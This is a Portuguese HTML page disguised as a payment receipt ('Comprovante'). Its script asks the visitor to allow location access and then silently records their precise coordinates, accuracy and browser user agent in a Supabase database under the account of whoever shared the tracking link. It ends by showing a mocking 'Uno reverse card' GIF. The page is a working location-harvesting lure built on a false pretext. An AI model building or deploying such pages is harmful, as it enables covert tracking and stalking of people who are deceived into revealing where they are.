<!doctype html><html lang="pt-BR"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Comprovante</title><link rel="stylesheet" href="/styles.css"></head><body><main class="wrap"><section class="card" id="app"><h1>Comprovante</h1><p>Permitir localização para continuar.</p><button class="btn" id="permitir">Permitir Localização</button><div id="msg"></div></section></main><script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script><script src="/config.js"></script><script src="/lib/supabase.js"></script><script>permitir.onclick=()=>{const ref=new URLSearchParams(location.search).get("ref");if(!ref)return msg.textContent="Link inválido.";navigator.geolocation.getCurrentPosition(async p=>{const l=await sb.from("links_compartilhados").select("id,user_id").eq("slug",ref).eq("ativo",true).maybeSingle();if(!l.data)return msg.textContent="Link inválido ou desativado.";const r=await sb.from("localizacoes").insert({user_id:l.data.user_id,link_id:l.data.id,latitude:p.coords.latitude,longitude:p.coords.longitude,precisao_metros:p.coords.accuracy||null,user_agent:navigator.userAgent});if(r.error){console.error(r.error);msg.textContent="Não foi possível registrar a localização.";return}app.innerHTML='<h1>Carta Reverse do Uno</h1><div class="tenor-gif-embed" data-postid="11394353076404622319" data-share-method="host" data-aspect-ratio="0.678715" data-width="100%"><a href="https://tenor.com/view/metal-slug---thank-you-gif-11394353076404622319">Metal Slug - Thank You Sticker</a></div><script async src="https://tenor.com/embed.js"><\/script>'},()=>{msg.className="msg error";msg.textContent="A permissão de localização foi negada."},{enableHighAccuracy:true,timeout:30000,maximumAge:0})}</script></body></html>
